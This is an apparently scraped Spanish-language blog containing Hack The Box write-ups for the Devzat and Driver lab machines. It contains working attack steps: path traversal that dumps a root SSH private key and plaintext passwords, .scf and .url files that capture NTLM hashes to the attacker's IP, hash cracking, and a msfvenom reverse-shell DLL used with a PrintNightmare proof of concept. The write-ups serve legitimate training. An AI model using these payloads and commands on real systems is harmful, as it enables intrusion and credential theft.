\u0026#34;user\u0026#34; { \u0026#34;results\u0026#34;: [ { \u0026#34;series\u0026#34;: [ { \u0026#34;columns\u0026#34;: [ \u0026#34;time\u0026#34;, \u0026#34;enabled\u0026#34;, \u0026#34;password\u0026#34;, \u0026#34;username\u0026#34; ], \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;values\u0026#34;: [ [ \u0026#34;2021-06-22T20:04:16.313965493Z\u0026#34;, false, \u0026#34;WillyWonka2021\u0026#34;, \u0026#34;wilhelm\u0026#34; ], [ \u0026#34;2021-06-22T20:04:16.320782034Z\u0026#34;, true, \u0026#34;woBeeYareedahc7Oogeephies7Aiseci\u0026#34;, \u0026#34;catherine\u0026#34; ], [ \u0026#34;2021-06-22T20:04:16.996682002Z\u0026#34;, true, \u0026#34;RoyalQueenBee$\u0026#34;, \u0026#34;charles\u0026#34; ] ] } ], \u0026#34;statement_id\u0026#34;: 0 } ] } [devzat] Insert query (exit to change db): Shell Utilizando las contraseñas con catherine logramos obtener una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 patrick@devzat:~$ su catherine Password: catherine@devzat:/home/patrick$ whoami catherine catherine@devzat:/home/patrick$ cd catherine@devzat:~$ ls user.txt catherine@devzat:~$ cat user.txt 5890b3e0aa54770c37e6b7c5e938baf1 catherine@devzat:~$ Privesc Con catherine logramos obtener acceso al backup, donde identificamos los cambios, vemos la funcion fileCommand que obtiene dos parametros, la direccion de un archivo y la contraseña que encontramos en el codigo fuente, dicha funcion realiza la lectura de un archivo.\ngo\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 func fileCommand(u *user, args []string) { if len(args) \u0026lt; 1 { u.system(\u0026#34;Please provide file to print and the password\u0026#34;) return } if len(args) \u0026lt; 2 { u.system(\u0026#34;You need to provide the correct password to use this function\u0026#34;) return } path := args[0] pass := args[1] // Check my secure password if pass != \u0026#34;CeilingCatStillAThingIn2021?\u0026#34; { u.system(\u0026#34;You did provide the wrong password\u0026#34;) return } // Get CWD cwd, err := os.Getwd() if err != nil { u.system(err.Error()) } // Construct path to print printPath := filepath.Join(cwd, path) // Check if file exists if _, err := os.Stat(printPath); err == nil { // exists, print file, err := os.Open(printPath) if err != nil { u.system(fmt.Sprintf(\u0026#34;Something went wrong opening the file: %+v\u0026#34;, err.Error())) return } defer file.Close() scanner := bufio.NewScanner(file) for scanner.Scan() { u.system(scanner.Text()) } if err := scanner.Err(); err != nil { u.system(fmt.Sprintf(\u0026#34;Something went wrong printing the file: %+v\u0026#34;, err.Error())) } return } else if os.IsNotExist(err) { // does not exist, print error u.system(fmt.Sprintf(\u0026#34;The requested file @ %+v does not exist!\u0026#34;, printPath)) return } // bokred? u.system(\u0026#34;Something went badly wrong.\u0026#34;) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 catherine@devzat:/dev/shm$ ls dev devzat-dev.zip devzat-main.zip main catherine@devzat:/dev/shm$ diff dev main diff dev/allusers.json main/allusers.json 1c1,3 \u0026lt; {} --- \u0026gt; { \u0026gt; \u0026#34;eff8e7ca506627fe15dda5e0e512fcaad70b6d520f37cc76597fdb4f2d83a1a3\u0026#34;: \u0026#34;\\u001b[38;5;214mtest\\u001b[39m\u0026#34; \u0026gt; } diff dev/commands.go main/commands.go 4d3 \u0026lt; \u0026#34;bufio\u0026#34; 6,7d4 \u0026lt; \u0026#34;os\u0026#34; \u0026lt; \u0026#34;path/filepath\u0026#34; 40d36 \u0026lt; file = commandInfo{\u0026#34;file\u0026#34;, \u0026#34;Paste a files content directly to chat [alpha]\u0026#34;, fileCommand, 1, false, nil} 42,101c38 \u0026lt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file} \u0026lt; } \u0026lt; \u0026lt; func fileCommand(u *user, args []string) { \u0026lt; if len(args) \u0026lt; 1 { \u0026lt; u.system(\u0026#34;Please provide file to print and the password\u0026#34;) \u0026lt; return \u0026lt; } \u0026lt; \u0026lt; if len(args) \u0026lt; 2 { \u0026lt; u.system(\u0026#34;You need to provide the correct password to use this function\u0026#34;) \u0026lt; return \u0026lt; } \u0026lt; \u0026lt; path := args[0] \u0026lt; pass := args[1] \u0026lt; \u0026lt; // Check my secure password \u0026lt; if pass != \u0026#34;CeilingCatStillAThingIn2021?\u0026#34; { \u0026lt; u.system(\u0026#34;You did provide the wrong password\u0026#34;) \u0026lt; return \u0026lt; } \u0026lt; \u0026lt; // Get CWD \u0026lt; cwd, err := os.Getwd() \u0026lt; if err != nil { \u0026lt; u.system(err.Error()) \u0026lt; } \u0026lt; \u0026lt; // Construct path to print \u0026lt; printPath := filepath.Join(cwd, path) \u0026lt; \u0026lt; // Check if file exists \u0026lt; if _, err := os.Stat(printPath); err == nil { \u0026lt; // exists, print \u0026lt; file, err := os.Open(printPath) \u0026lt; if err != nil { \u0026lt; u.system(fmt.Sprintf(\u0026#34;Something went wrong opening the file: %+v\u0026#34;, err.Error())) \u0026lt; return \u0026lt; } \u0026lt; defer file.Close() \u0026lt; \u0026lt; scanner := bufio.NewScanner(file) \u0026lt; for scanner.Scan() { \u0026lt; u.system(scanner.Text()) \u0026lt; } \u0026lt; \u0026lt; if err := scanner.Err(); err != nil { \u0026lt; u.system(fmt.Sprintf(\u0026#34;Something went wrong printing the file: %+v\u0026#34;, err.Error())) \u0026lt; } \u0026lt; \u0026lt; return \u0026lt; \u0026lt; } else if os.IsNotExist(err) { \u0026lt; // does not exist, print error \u0026lt; u.system(fmt.Sprintf(\u0026#34;The requested file @ %+v does not exist!\u0026#34;, printPath)) \u0026lt; return \u0026lt; } \u0026lt; // bokred? \u0026lt; u.system(\u0026#34;Something went badly wrong.\u0026#34;) --- \u0026gt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode} diff dev/devchat.go main/devchat.go 27c27 \u0026lt; port = 8443 --- \u0026gt; port = 8000 114c114 \u0026lt; fmt.Sprintf(\u0026#34;127.0.0.1:%d\u0026#34;, port), --- \u0026gt; fmt.Sprintf(\u0026#34;:%d\u0026#34;, port), Only in dev: testfile.txt catherine@devzat:/dev/shm$ Con una conexion al puerto 8443 de la version en desarrollo, pasamos el archivo y contraseña, obtuvimos acceso a la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 catherine@devzat:~$ ssh 127.0.0.1 -p 8443 The authenticity of host \u0026#39;[127.0.0.1]:8443 ([127.0.0.1]:8443)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:liAkhV56PrAa5ORjJC5MU4YSl8kfNXp+QuljetKw0XU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;[127.0.0.1]:8443\u0026#39; (ED25519) to the list of known hosts. patrick: Hey Catherine, glad you came. catherine: Hey bud, what are you up to? patrick: Remember the cool new feature we talked about the other day? catherine: Sure patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443. catherine: Kinda busy right now 👔 patrick: That\u0026#39;s perfectly fine 👍 You\u0026#39;ll need a password which you can gather from the source. I left it in our default backups location. catherine: k patrick: I also put the main so you could diff main dev if you want. catherine: Fine. As soon as the boss let me off the leash I will check it out. patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya! devbot: patrick has left the chat Welcome to the chat. There are no more users devbot: catherine has joined the chat catherine: /file root.txt CeilingCatStillAThingIn2021? [SYSTEM] The requested file @ /root/devzat/root.txt does not exist! catherine: /file ../root.txt CeilingCatStillAThingIn2021? [SYSTEM] 9a307cb29b87600731ec24276cf9c42f catherine: Shell Tambien logramos obtener la clave privada del usuario root.\n1 2 3 4 5 6 7 8 9 catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021? [SYSTEM] -----BEGIN OPENSSH PRIVATE KEY----- [SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW [SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1 [SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA [SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s [SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg== [SYSTEM] -----END OPENSSH PRIVATE KEY----- catherine: Con ella obtuvimos acceso por SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 π ~/htb/devzat ❯ chmod 600 root_id π ~/htb/devzat ❯ ssh root@devzat.htb -i root_id Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 17 Oct 2021 06:02:58 AM UTC System load: 0.05 Processes: 253 Usage of /: 59.0% of 7.81GB Users logged in: 1 Memory usage: 39% IPv4 address for docker0: 172.17.0.1 Swap usage: 0% IPv4 address for eth0: 10.10.11.118 107 updates can be applied immediately. 33 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Oct 11 14:28:01 2021 root@devzat:~# whoami; id; pwd root uid=0(root) gid=0(root) groups=0(root) /root root@devzat:~# cat root.txt 07e6db32efce01eb2368c0f813fd0ad1 root@devzat:~# ","description":"Devzat presenta un sitio web donde identificamos una vulnerabilidad de 'Command Injection', tambien, se expone el chat Devzat por SSH donde obtuvimos información acerca de la base de datos y la versión en Desarrollo del chat. Explotamos una vulnerabilidad en InfluxDB lo que nos permitió acceder a un segundo usuario. Finalmente escalamos privilegios analizando el codigo fuente de la version en Desarrollo, lo que nos permitió realizar la lectura de archivos como root y obtener acceso por SSH.","id":33,"section":"posts","tags":["devzat-chat","command injection","influxDB","go","","","",""],"title":"Hack The Box - Devzat","uri":"https://sckull.github.io/posts/devzat/"},{"content":"\rEn driver encontramos un sitio web que nos permite subir archivos a un recurso compartido de SMB, utilizamos un archivo sfc lo que nos permitió obtener el hash de un primer usuario y acceso por WinRM. Finalmente escalamos privilegios explotando la vulnerabilidad del servicio spool con PrintNightmare.\nNombre Driver OS Windows Puntos 20 Dificultad Facil IP 10.10.11.106 Maker MrR3boot\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.9, 5.9, 6.2, 3.8, 4.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Nmap nmap muestra distintos puertos abiertos: HTTP (80), RPC (445), SMB (445), WinRM (5985).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 Nmap scan report for driver.htb (10.10.11.106) Host is up (0.11s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h19m09s, deviation: 0s, median: 7h19m08s | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-10-05T07:24:55 |_ start_date: 2021-10-05T06:27:26 SMB Utilizando algunas herramientas intentamos enumerar los recursos compartidos en samba pero no encontramos alguno.\n1 2 3 4 5 6 7 π ~/htb/driver ❯ smbclient -L 10.10.11.106 Enter WORKGROUP\\kali\u0026#39;s password: session setup failed: NT_STATUS_ACCESS_DENIED π ~/htb/driver ❯ crackmapexec smb 10.10.11.106 --shares SMB 10.10.11.106 445 DRIVER [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) SMB 10.10.11.106 445 DRIVER [-] Error enumerating shares: Error occurs while reading from remote(104) π ~/htb/driver ❯ RPC De igual forma con una sesion nula por RCP no logramos ingresar.\n1 2 3 π ~/htb/driver ❯ rpcclient -U \u0026#34;\u0026#34; -N 10.10.11.106 Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED π ~/htb/driver ❯ Web Site En el puerto 80 vemos que pregunta por credenciales para el usuario admin.\nUtilizamos el nombre de usuario como contraseña (admin:admin) con los cuales logramos ingresar. Observamos un mensaje sobre tests de firmwares y drivers, además se muestra un dominio en el footer de la pagina el cual agregamos al archivo /etc/hosts.\nVemos en la pagina de Firmware Updates un formulario para subir acrhivos de actualización de firmware, en el mensaje indica la selección de un modelo de impresora y, al subir los archivos estos se guardarían en algun recurso compartido de archivos (\u0026ldquo;refiriendose a SMB\u0026rdquo;), y que, algun equipo realizará una revision y testing.\nDirectory Brute Forcing Utilizamos feroxbuster para busqueda de directorios y archivos, con la extensión php junto con el header de autenticacion del sitio. Vemos que solo se muestran un par de direcciónes y ninguna relacionada a una carpeta de archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 π ~/htb/driver ❯ feroxbuster -u http://driver.htb/ -w $MD -x php -H \u0026#34;Authorization: Basic YWRtaW46YWRtaW4=\u0026#34; ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://driver.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🤯 Header │ Authorization: Basic YWRtaW46YWRtaW4= 💲 Extensions │ [php] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 2l 10w 148c http://driver.htb/images 200 185l 379w 4279c http://driver.htb/index.php 301 2l 10w 148c http://driver.htb/Images 200 185l 379w 4279c http://driver.htb/Index.php User - Tony El sitio web nos permite subir archivos, intentamos con diferentes formatos pero parece ser que ninguno es ejecutado o movido a algun otro directorio. Al investigar sobre ataques por archivos en SMB, encontramos SCF File Attacks. Dicho ataque utiliza una direccion UNC o direccion de recurso definida en IconFile dentro de un archivo .scf, al colocar este archivo en un recurso y un usuario al acceder a este, el archivo es ejecutado y, el usuario intenta acceder al recurso definido (IconFile) lo que hace que se autentique en el recurso y al tener responder en ejecución es posible capturar el hash de autenticación del usuario.\nReplicamos este ataque, creando un archivo que contenga nuestra direccion IP.\n1 2 3 4 5 6 7 π ~/htb/driver ❯ cat scx.scf [Shell] Command=2 IconFile=\\\\10.10.10.15\\sckull.ico [Taskbar] Command=ToggleDesktop π ~/htb/driver ❯ Ejecutamos responder, subimos el archivo y tras unos segundos vemos que el usuario tony accede al recurso, con ello obtuvimos el hash ntlm.\n1 2 3 4 5 6 [SMB] NTLMv2-SSP Client : 10.10.11.106 [SMB] NTLMv2-SSP Username : DRIVER\\tony [SMB] NTLMv2-SSP Hash : tony::DRIVER:0b940ebf05184c8d:2CEA298880C79699FAED0D1BD590BA8E:010100000000000080A2972CCEB7D70160670D2514033A9300000000020008003600340030004D0001001E00570049004E002D005600440041005600410041004300580055003700530004003400570049004E002D00560044004100560041004100430058005500370053002E003600340030004D002E004C004F00430041004C00030014003600340030004D002E004C004F00430041004C00050014003600340030004D002E004C004F00430041004C000700080080A2972CCEB7D70106000400020000000800300030000000000000000000000000200000D7D5A09B6D6231233A414B29A11FD4730FD7091D7057F8686380C4839199EAF50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0033003000000000000000000000000000 [*] Skipping previously captured hash for DRIVER\\tony [*] Skipping previously captured hash for DRIVER\\tony [*] Skipping previously captured hash for DRIVER\\tony Crack Hash Utilizamos John con el wordlist rockyou.txt para crackear el hash de tony.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/driver ❯ john --wordlist=$ROCK hash_tony Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status liltony (tony) 1g 0:00:00:00 DONE (2021-10-02 20:44) 9.090g/s 297890p/s 297890c/s 297890C/s !!!!!!..eatme1 Use the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably Session completed π ~/htb/driver ❯ Shell nmap mostró que el puerto WinRM esta abierto, utilizamos las credenciales que obtuvimos para acceder por este puerto utilizando evil-winrm, logrando obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/driver ❯ evil-winrm -i driver.htb -u tony -p liltony Evil-WinRM shell v3.3 Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; whoami driver\\tony *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; type ..\\Desktop\\user.txt 4d5bc94c1589f8e3d3bbc7ef748c97e6 *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; .URL De igual forma utilizando un archivo .url funciona para obtener el hash de tony.\n1 2 3 4 5 [InternetShortcut] URL=whatever WorkingDirectory=whatever IconFile=\\\\10.10.10.15\\%USERNAME%.icon IconIndex=1 Web Site En el directorio inetpub\\ encontramos el codigo fuente de la página, vemos que esta definido el tipo de autenticacion por http y se muestran las credenciales, además vemos que el directorio donde se almacenan los archivos es C:\\firmwares\\.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 *Evil-WinRM* PS C:\\inetpub\\wwwroot\u0026gt; dir -Force Directory: C:\\inetpub\\wwwroot Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/7/2021 11:29 PM images -a---- 9/8/2021 5:06 AM 6136 fw_up.php -a---- 9/8/2021 4:51 AM 4906 index.php *Evil-WinRM* PS C:\\inetpub\\wwwroot\u0026gt; cat fw_up.php \u0026lt;?php if( ( isset($_SERVER[\u0026#39;PHP_AUTH_USER\u0026#39;] ) \u0026amp;\u0026amp; ( $_SERVER[\u0026#39;PHP_AUTH_USER\u0026#39;] == \u0026#34;admin\u0026#34; ) ) AND ( isset($_SERVER[\u0026#39;PHP_AUTH_PW\u0026#39;] ) \u0026amp;\u0026amp; ( $_SERVER[\u0026#39;PHP_AUTH_PW\u0026#39;] == \u0026#34;admin\u0026#34; )) ) { if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;]==\u0026#34;POST\u0026#34;){ $target_dir = \u0026#34;C:\\\\firmwares\\\\\u0026#34;; $target_file = $target_dir . basename($_FILES[\u0026#34;firmware\u0026#34;][\u0026#34;name\u0026#34;]); if (move_uploaded_file($_FILES[\u0026#34;firmware\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) { header(\u0026#39;Location: fw_up.php?msg=SUCCESS\u0026#39;); } else { header(\u0026#39;Location: fw_up.php?msg=ERR\u0026#39;); } } else {?\u0026gt; [... snip ...] \u0026lt;br/\u0026gt;\u0026lt;p\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp; Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon. \u0026lt;br/\u0026gt;\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;br/\u0026gt;\u0026lt;center\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Printer Model:\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;select name=\u0026#34;printers\u0026#34; id=\u0026#34;printers\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;HTB DesignJet\u0026#34;\u0026gt;HTB DesignJet\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;HTB Ecotank\u0026#34;\u0026gt;HTB Ecotank\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;HTB Laserjet Pro\u0026#34;\u0026gt;HTB Laserjet Pro\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;HTB Mono\u0026#34;\u0026gt;HTB Mono\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Upload Firmware:\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;firmware\u0026#34; name=\u0026#34;firmware\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;Submit\u0026#34; value=\u0026#34;Submit\u0026#34;/\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;div class=\u0026#34;footer\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026amp;#169; 2021 Driver Inc\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;mailto:support@driver.htb\u0026#34;\u0026gt;support@driver.htb\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php }}else { //Send headers to cause a browser to request //username and password from user header(\u0026#34;WWW-Authenticate: \u0026#34; . \u0026#34;Basic realm=\\\u0026#34;MFP Firmware Update Center\\\u0026#34;\u0026#34;); header(\u0026#34;HTTP/1.0 401 Unauthorized\u0026#34;); //Show failure text, which browsers usually //show only after several failed attempts print(\u0026#34;Invalid Credentials\u0026#34;); } ?\u0026gt; *Evil-WinRM* PS C:\\inetpub\\wwwroot\u0026gt; Dicho directorio no contiene nada, quizas algun cronjob elimina cada cierto tiempo los archivos.\n1 2 *Evil-WinRM* PS C:\\inetpub\\wwwroot\u0026gt; dir -Force C:\\firmwares\\ *Evil-WinRM* PS C:\\inetpub\\wwwroot\u0026gt; Privesc Ejecutamos WinPEAS, donde vemos una tarea programada al cual Tony tiene acceso.\n1 2 3 4 5 6 ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft-- È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries (DRIVER\\Administrator) VerifyFirmware: C:\\Users\\tony\\appdata\\local\\job\\job.bat Permissions file: tony [AllAccess] Permissions folder(DLL Hijacking): tony [AllAccess] Trigger: At log on of DRIVER\\tony Vemos que el script accede a la carpeta donde se encuentran los archivos subidos en el sitio web utilizando el Explorer.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; cat C:\\Users\\tony\\appdata\\local\\job\\job.bat @echo off :LOOP %SystemRoot%\\explorer.exe \u0026#34;C:\\firmwares\u0026#34; ping -n 20 127.0.0.1 \u0026gt; nul \u0026amp;\u0026amp; powershell -ep bypass c:\\users\\tony\\appdata\\local\\job\\quit.ps1 DEL /q C:\\firmwares\\* cls GOTO :LOOP :EXIT *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; cat c:\\users\\tony\\appdata\\local\\job\\quit.ps1 $folder = [uri]\u0026#39;C:\\firmwares\u0026#39; foreach ($w in (New-Object -ComObject Shell.Application).Windows()){ if ($w.LocationUrl -ieq $folder.AbsoluteUri){ $w.Quit(); break } } *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; Finalmente vemos en el historial de la consola una impresora que fue agregada utilizando powershell, dicha version de impresora puede ser explotada para Escalar Privilegios, sin embargo por alguna razon la explotación no tuvo exito, aún asi intentado con el Modulo de Metasploit.\n1 2 3 4 5 6 *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; cat \u0026#34;C:\\Users\\tony\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\u0026#34; Add-Printer -PrinterName \u0026#34;RICOH_PCL6\u0026#34; -DriverName \u0026#39;RICOH PCL6 UniversalDriver V4.23\u0026#39; -PortName \u0026#39;lpt1:\u0026#39; ping 1.1.1.1 ping 1.1.1.1 *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; PrintNightmare Recientemente se descubrió una vulnerabilidad en el servicio Spooler que permite escalar privilegios - (CVE-2021-34527). Al escanear la maquina utilizando rpcdump vemos que podria ser vulnerable.\n1 2 3 4 π ~/htb/driver ❯ impacket-rpcdump tony:liltony@driver.htb | egrep \u0026#39;MS-RPRN|MS-PAR\u0026#39; Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol π ~/htb/driver ❯ cube0x0 Para explotar la vulnerabilidad utilizamos el PoC de cube0x0 que encontramos en el Repositorio de GitHub - CVE-2021-1675, realizamos la instalación de la version modificada de impacket.\n1 2 3 4 pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install Para la explotación necesitamos un servidor samba, impacket provee el script smbserver para crear uno.\n1 2 3 4 5 6 7 8 9 π ~/htb/driver ❯ impacket-smbserver sc . Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed El PoC necesita un DLL el cual es ejecutado, utilizamos msfvenom para generar una DLL con shell inversa, almancenando esta en el directorio donde ejecutamos smbserver.\n1 2 3 4 5 6 7 8 π ~/htb/driver ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1339 -f dll -o sc.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 8704 bytes Saved as: sc.dll π ~/htb/driver ❯ Finalmente ejcutamos el PoC pasando las credenciales y la dirección del DLL en nuestro servidor 